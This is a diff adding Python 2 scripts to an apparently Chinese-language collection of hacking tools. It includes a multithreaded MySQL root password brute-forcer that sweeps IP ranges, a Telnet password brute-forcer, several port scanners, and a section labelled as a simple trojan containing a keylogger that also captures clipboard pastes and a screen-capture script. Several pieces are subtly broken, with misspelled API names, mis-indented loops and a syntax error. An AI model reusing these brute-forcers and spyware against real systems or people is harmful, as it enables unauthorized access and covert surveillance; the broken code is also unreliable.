@@ -1272,7 +1272,93 @@ if __name__ == '__main__':
 ## 12、多线程爆破mysql
 
 ```python
+# -*- coding: utf-8 -*-
 
+import threading
+import argparse
+import socket
+import Queue
+import netaddr
+import MySQLdb
+import time
+import sys
+
+class Mysqlfuzz:
+
+    def __init__(self,addr,tnum):
+        self.scanque = Queue.Queue()
+        self.tnum = tnum
+        self.tmpnum = tnum
+        self.lock = threading.Lock()
+        self.openlist = []
+        if addr.find("-") != -1:     #ip地址识别
+            for ip in netaddr.IPRange(addr.split("-")[0],addr.split("-")[1]):
+                self.scanque.put(ip)
+        else:
+            for ip in netaddr.IPNetwork(addr).iter_hosts():
+                self.scanque.put(ip)
+        self.qsize = self.scanque.qsize() #队列大小
+        for i in range(tnum): #开启线程
+            t = threading.Thread(target=self.ScanPort)
+            t.setDaemon(True)
+            t.start()
+        while self.tmpnum > 0:
+            time.sleep(1.0)
+        print "[*]:cracking MySQL Password ..."
+        with open("pass.txt","r") as file: #读取字典
+            data = file.readlines()
+        for ip in self.openlist: #逐条尝试密码
+            for line in data:
+                self.scanque.put(line.strip())
+            for i in range(tnum):
+                t = threading.Thread(target=self.Crack,args=(ip,))
+                t.setDaemon(True)
+                t.start()
+            while self.scanque.qsize() > 0:
+                time.sleep(1.0)
+
+    def Crack(self,ip): #连接目标MySQL数据库
+        while self.scanque.qsize() > 0:
+            try:
+                password = self.scanque.get()
+                conn = MySQLdb.connect(host=ip, user='root', passwd=password, db='test', port=3306, connect_timeout=4)
+                self.lock.acquire()
+                msg = "[+]:%s Username: root Password is: %s" % (ip, password)
+                print msg
+                output = open('good.txt', 'a')
+                output.write(msg + "\r\n")
+                self.lock.release()
+                break
+            except:
+                pass
+
+    def ScanPort(self):  # 查看目标3306端口状态
+        while self.scanque.qsize() > 0:
+            try:
+                ip = self.scanque.get()
+                s = socket.socket()
+                s.settimeout(4)
+                s.connect((str(ip), 3306))
+                self.lock.acquire()
+                print ip, " 3306 open"
+                self.openlist.append(str(ip))
+                self.lock.release()
+            except:
+                pass
+        self.tmpnum -= 1
+
+if __name__ == "__main__":  # 获取命令行参数并开始尝试暴力破解
+    parse = argparse.ArgumentParser(description="mysqlfuzz")
+    parse.add_argument('-a', '--addr', type=str, help="ipaddress")
+    parse.add_argument('-t', '--thread', type=int, help="ThreadNumber",default=100)
+    args = parse.parse_args()
+    if not args.addr:
+        parse.print_help()
+        sys.exit(0)
+    addr = args.addr
+    tnum = args.thread
+
+Mysqlfuzz(addr, tnum)
 ```
 
 ## 13、IP段端口扫描
@@ -1280,13 +1366,195 @@ if __name__ == '__main__':
 {% tabs %}
 {% tab title="UI界面与扫描函数" %}
 ```python
+# -*- coding: utf-8 -*-
 
+from PyQt4 import Qtcore,QtGui
+import sys
+import socket
+import threading,time
+import thread
+import ini
+import time # 获取时间和延时
+
+socket.setdefaulttimeout(10)    # 设置全局默认超过时间
+
+try:
+    _fromUtf8 = Qtcore.Qstring.fromUtf8
+except AttributeError:
+    _fromUtf8 = lambda s: s
+
+class Ui_Form(object):
+
+    def setupUi(self,Form):
+        Form.setObjectName(_fromUtf8("Form"))
+        Form.resize(272, 482)
+        self.textEdit = QtGui.QTextEdit(Form)
+        self.textEdit.setGeometry(QtCore.QRect(60, 10, 201, 31))
+        self.textEdit.setObjectName(_fromUtf8("textEdit"))
+        self.textEdit_2 = QtGui.QTextEdit(Form)
+        self.textEdit_2.setGeometry(QtCore.QRect(60, 50, 201, 31))
+        self.textEdit_2.setObjectName(_fromUtf8("textEdit_2"))
+        self.textEdit_3 = QtGui.QTextEdit(Form)
+        self.textEdit_3.setGeometry(QtCore.QRect(60, 90, 81, 31))
+        self.textEdit_3.setObjectName(_fromUtf8("textEdit_3"))
+        self.label = QtGui.QLabel(Form)
+        self.label.setGeometry(QtCore.QRect(10, 30, 54, 12))
+        self.label.setObjectName(_fromUtf8("label"))
+        self.label_2 = QtGui.QLabel(Form)
+        self.label_2.setGeometry(QtCore.QRect(10, 70, 54, 12))
+        self.label_2.setObjectName(_fromUtf8("label_2"))
+        self.label_3 = QtGui.QLabel(Form)
+        self.label_3.setGeometry(QtCore.QRect(20, 110, 54, 12))
+        self.label_3.setObjectName(_fromUtf8("label_3"))
+        self.pushButton = QtGui.QPushButton(Form)
+        self.pushButton.setGeometry(QtCore.QRect(160, 90, 101, 31))
+        self.pushButton.setObjectName(_fromUtf8("pushButton"))
+        self.textEdit_4 = QtGui.QTextEdit(Form)
+        self.textEdit_4.setGeometry(QtCore.QRect(10, 150, 251, 321))
+        self.textEdit_4.setObjectName(_fromUtf8("textEdit_4"))
+        self.label_4 = QtGui.QLabel(Form)
+        self.label_4.setGeometry(QtCore.QRect(70, 130, 251, 25))
+        self.label_4.setObjectName(_fromUtf8("label_4"))
+        self.retranslateUi(Form)
+        QtCore.QMetaObject.connectSlotsByName(Form)
+        QtCore.QObject.connect(self.pushButton, QtCore.SIGNAL(_fromUtf8("clicked()")), self.test)
+
+    def test(self):
+        thread.start_new_thread(self.mess, ())
+
+    def mess(self):
+        ip1 = self.textEdit.toPlainText()  # 获取内容
+        ip2 = self.textEdit_2.toPlainText()  # 获取内容
+        port = self.textEdit_3.toPlainText()  # 获取内容
+        ini.ini_write(ip1, ip2, port)  # 修改INI
+        self.textEdit_4.append(u"扫描结果会保存在程序目录下ip.txt")
+        list_ip = self.gen_ip(self.ip2num(ip1), self.ip2num(ip2))
+        self.pushButton.setEnabled(0)  # 将按钮改成禁用
+        self.textEdit_4.append(u"需要扫描" + str(len(list_ip)) + u"个IP")
+        I1 = 0  # 得到list的第一个元素
+        ip = 0
+        self.textEdit_4.append(u"开始扫描IP--" + time.strftime('%Y.%m.%d-%H. %M. %S'))
+        while I1 < len(list_ip):
+            if ip >= 200:
+                ini.ini_write(list_ip[I1], ini.IP2, port)  # 修改INI
+        ip = 0
+        print list_ip[I1]
+        ip = ip + 1
+        time.sleep(0.1)  # 确保先运行Seeker中的方法
+
+        thread.start_new_thread(self.socket_port, (list_ip[I1], int(port)))
+        I1 = I1 + 1  # 一层
+        self.textEdit_4.append(u"IP扫描完成--" + time.strftime('%Y.%m.%d-%H.%M.%S'))
+        self.pushButton.setEnabled(1)  # 将按钮改成可用
+
+    def socket_port(self,ip,PORT):
+        try:
+            self.label_4.setText(U"正在扫描IP:"+str(ip)+u":"+str(PORT))
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,PORT))
+            self.textEdit_4.append(str(ip)+u":"+str(PORT)+u"端口开放")
+            xxx=file('ip.txt','w')
+            xxx.write(str(ip))
+            xxx.write('\n')
+            xxx.close()
+        except:
+            print ip, u":", PORT, u"端口未开放"
+    def ip2num(self,ip):
+        ip = [int(x) for x in ip.split('.')]
+        return ip[0]<<24 | ip[1]<<16 | ip[2]<<8 | ip[3]
+
+    def num2ip(self,num):
+         if num>=IPend:
+         self.textEdit_4.append(u"IP导入数组完成")
+         return '%s.%s.%s.%s' % ( (num & 0xff000000) >> 24,(num & 0x00ff0000) >> 16,(num & 0x0000ff00) >> 8,num & 0x000000ff)
+
+    def gen_ip(self,Aip1,Aip2): #返回数组
+         global IPend
+         IPend=Aip2
+         return [self.num2ip(num) for num in range(Aip1,Aip2+1) if num & 0xff]
+
+    def iniA(self):
+        ini.ini_get()  # 读取INI
+        self.textEdit.setPlainText(ini.IP1)
+        self.textEdit_2.setPlainText(ini.IP2)
+        self.textEdit_3.setPlainText(ini.port)
+
+    def retranslateUi(self, Form):
+        Form.setWindowTitle(QtGui.QApplication.translate("Form","Simple", None, QtGui.QApplication.UnicodeUTF8))
+        self.label.setText(QtGui.QApplication.translate("Form", "开始IP：", None, QtGui.QApplication.UnicodeUTF8))
+        self.label_2.setText(QtGui.QApplication.translate("Form", "结束IP：", None, QtGui.QApplication.UnicodeUTF8))
+        self.label_3.setText(QtGui.QApplication.translate("Form", "端口：", None, QtGui.QApplication.UnicodeUTF8))
+        self.pushButton.setText(QtGui.QApplication.translate("Form", "开始扫描", None, QtGui.QApplication.UnicodeUTF8))
+        self.label_4.setText(QtGui.QApplication.translate("Form", "扫描结果", None, QtGui.QApplication.UnicodeUTF8))
+
+class Start(QtGui.QMainWindow):
+
+    def __init__(self,parent=None):
+        QtGui.QWidget.__init__(self,parent)
+        self.ui=Ui_Form()
+        self.ui.setupUi(self)
+        self.ui.iniA()
+
+if __name__ == '__main__':
+    app = QtGui.QApplication(sys.argv)
+    myapp = Start()
+    myapp.show()
+    sys.exit(app.exec_())
 ```
 {% endtab %}
 
 {% tab title="ini.py" %}
-```
+```python
+# -*- coding: utf-8 -*-
 
+IP1 = ""    #扫描IP
+IP2 = ""    #当前已经扫到的IP
+port = ""   #扫描端口
+INITXT = "IP.ini"   # INI文件名字
+
+import ConfigParser
+
+def ini_get():  # 读取INI
+    try:
+        global IP1
+        global IP2
+        global port
+        global INITXT
+        config = ConfigParser.ConfigParser()
+        config.readfp(open(INITXT))
+        IP1 = config.get("ipdata","ip1")
+        IP2 = config.get("ipdata","ip2")
+        port = config.get("ipdata","port")
+    except:
+        print "读取INI错误"
+        ini_add("","","")   # 写入INI
+
+def ini_add(ip1,ip2,pt):# 写入INI
+    try:
+        global INITXT
+        config = ConfigParser.ConfigParser()
+        config.add_section("ipdata")    # 设置section段及对应的值
+        config.set("ipdata","ip1",ip1)
+        config.set("ipdata", "ip2", ip2)
+        config.set("ipdata", "pt", pt)
+        config.write(open(INITXT,"w"))  # 写入文件
+    except:
+        print "写入INI错误"
+
+def ini_write(ip1,ip2,pt):  #修改INI
+    try:
+        global INITXT
+        config = ConfigParser.ConfigParser()
+        config.read(INITXT)
+        if not config.has_section("ipdata"):    #看是否存在该Section，不存在则创建
+            temp = config.add_section("")
+        config.set("ipdata","ip1",ip1)
+        config.set("ipdata", "ip2", ip2)
+        config.set("ipdata", "pt", pt)
+        config.write(open(INITXT,"r+"))
+    except:
+        print "修改INI错误"
+        ini_add("","")  # 写入INI
 ```
 {% endtab %}
 {% endtabs %}
@@ -1296,13 +1564,66 @@ if __name__ == '__main__':
 {% tabs %}
 {% tab title="简易脚本" %}
 ```python
+# -*- coding: utf-8 -*-
 
+from socket import *
+
+# 简单扫描
+def PortScanner(host,port):
+    try:
+        s = socket(AF_INET,SOCK_STREAM)
+        s.connect((host,port))
+        print("[+] %d open" % port)
+        s.close()
+    except:
+        print("[-] %d close" % port)
+def main():
+    setdefaulttimeout(1)
+    for p in range(20,100):
+        PortScanner('192.168.1.3',p)
+if __name__ == '__main__':
+    main()
 ```
 {% endtab %}
 
 {% tab title="创建线程" %}
-```
+```python
+# -*- coding: utf-8 -*-
 
+from socket import *
+import threading
+
+lock = threading.Lock()
+openNum = 0
+threads = []
+
+# 简单扫描
+def PortScanner(host,port):
+    global openNum
+    try:
+        s = socket(AF_INET,SOCK_STREAM)
+        s.connect((host,port))
+        lock.acquire()      #所定成员
+        openNum += 1
+        print("[+] %d open" % port)
+        lock.release()  #解锁
+        s.close()
+    except:
+        pass
+
+def main():
+    setdefaulttimeout(1)
+    for p in range(1,1024):     #端口范围
+        t = threading.Thread(target=PortScanner,args=('192.168.1.3',p))
+        threads.append(t)   #创建threads数据
+        t.start()
+    for t in threads:
+        t.join()
+    print("[*] The scan is complete!")
+    print("[*] a total of %d open port" % (openNum))
+
+if __name__ == '__main__':
+    main()
 ```
 {% endtab %}
 {% endtabs %}
@@ -1310,7 +1631,44 @@ if __name__ == '__main__':
 ## 15、Telnet密码爆破
 
 ```python
+# -*- coding: utf-8 -*-
 
+import telnetlib
+import time
+import sys
+import os
+
+def do_telnet(Host, Port, username, passowrd, finish):
+    # 链接Telnet服务器
+    tn = telnetlib.Telnet(Host, Port, timeout=1)
+    tn.set_debuglevel(3)
+    # 输入登录用户名
+    tn.read_until("login: ")
+    tn.write(str(username)+'\n')
+    # 输入登录密码
+    tn.read_until("Password: ")
+    tn.write(str(passowrd) + '\n')
+    # 判断密码错误提示，如果没有提示说明登录成功
+    if tn.read_until(finish):
+        print "[-]Login Failed\n"
+    tn.close()
+
+if __name__ == '__main__':
+    Host = raw_input("IP:")     # talent服务器IP
+    Port = raw_input("Port:")   # Telnet服务器端口
+    username = 'root'           # 登录用户名
+    finish = 'incorrect'        # 密码错误提示
+    pw_file = open('pass.txt','r') # 密码文件
+    Index = 0
+    print time.asctime(),": begin","\n"
+    while True:
+        password = pw_file.readline()
+        Index += 1
+        print Index,time.asctime(),"Try","",username,":",password,""
+        if len(password) == 0:
+            break
+        do_telnet(Host, Port, username, password, finish)
+    pw_file.close()
 ```
 
 ## 16、简易木马程序
@@ -1318,14 +1676,128 @@ if __name__ == '__main__':
 {% tabs %}
 {% tab title="键盘记录" %}
 ```python
+# -*- coding: utf-8 -*-
+
+from ctypes import *
+import pyHook
+import win32clipboard
+
+user32 = windll.user32
+kernel32 = windll.kernel32
+psapi = windll.psapi
+current_window = None
+
+def get_current_process():
+    # 获取最上层的窗口句柄
+    hwnd = user32.GetForegroundWindow()
+
+    # 获取进程ID
+    pid = c_ulong(0)
+    user32.GetwindowThreadProcessId(hwnd,byref(pid))
+
+    # 将进程ID存入变量中
+    process_id = "%d" % pid.value
+
+    # 申请内存
+    executable = create_string_buffer("\0x00"*512)
+    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)
+
+    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
+
+    # 读取窗口标题
+    windows_title = create_string_buffer("\0x00"*512)
+    length = user32.GetwindowTextA(hwnd,byref(windows_title),512)
+
+    # 打印
+    print
+    print "[ PID: %s-%s-%s ]" % (process_id,executable.value,windows_title.value)
+    print
+
+    # 关闭handles
+    kernel32.CloseHandle(hwnd)
+    kernel32.CloseHandle(h_process)
+
+# 定义击键监听事件函数
+def KeyStroke(event):
+    global current_window
+
+    # 检测目标窗口是否转移（换了其他窗口就监听新的窗口）
+    if event.WindowName != current_window:
+        current_window = event.WindowName
+
+        # 函数调用
+        get_current_process()
+
+    # 检测击键是否常规按键（非组合键等）
+    if event.Ascii > 32 and event.Ascii < 127 :
+        print chr(event.Ascii)
+    else:
+        # 如果发现Ctrl+v（粘贴）事件，就把查娜铁板内容记录下来
+        if event.Key == "V":
+            win32clipboard.OpenClipboard()
+            pasted_value = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            print "[PASTE]-%s" % (pasted_value),
+        else:
+            print "[%s]" % event.Key
+
+    # 循环监听下一个击键事件
+    return True
+
+# 创建并注册hook管理器
+k1 = pyHook.HookManager()
+k1.KeyDown = KeyStroke
+
+# 注册hook并执行
+k1.HookKeyboard()
+pythoncom.PumpMessages()
 
 ```
 {% endtab %}
 
 {% tab title="屏幕截图" %}
-```
+```python
+# -*- coding: utf-8 -*-
+
+import win32gui
+import win32ui
+import win32con
+import win32api
+
+# 获取桌面
+hdesktop = win32gui.GetDesktopWindow()
+
+# 分辨率适应
+width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
+height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
+left = win32api.GetSystemMetrics(win32con.SM_XVVIRTUALSCREEN)
+top = win32api.GetSystemMetrics(win32con.SM_YVVIRTUALSCREEN)
+
+# 创建设备描述表
+desktop_dc = win32gui.GetWindowDC(hdesktop)
+img_dc = win32ui.CreateDCFromHandle(desktop_dc)
+
+# 创建一个内存设备描述表
+mem_dc = img_dc.CreateCompatibleDC()
+
+# 创建位图对象
+screenshot = win32ui.CreateBitmap()
+screenshot.CreateCompatibleBitmap(img_dc,width,height)
+mem_dc.SelectObject(screenshot)
+
+# 截图至内存设备描述表
+mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
+
+# 将截图保存到文件
+screenshot.SaveBitmapFile(mem_dc,'C:\\Users\\Administrator\\Desktop\\Screenshots.bmp')
+
+# 内存释放
+mem_dc.DeleteDC()
+win32gui.DeleteObject(screenshot.Gethandle())
 
 ```
 {% endtab %}
 {% endtabs %}
+
+
 
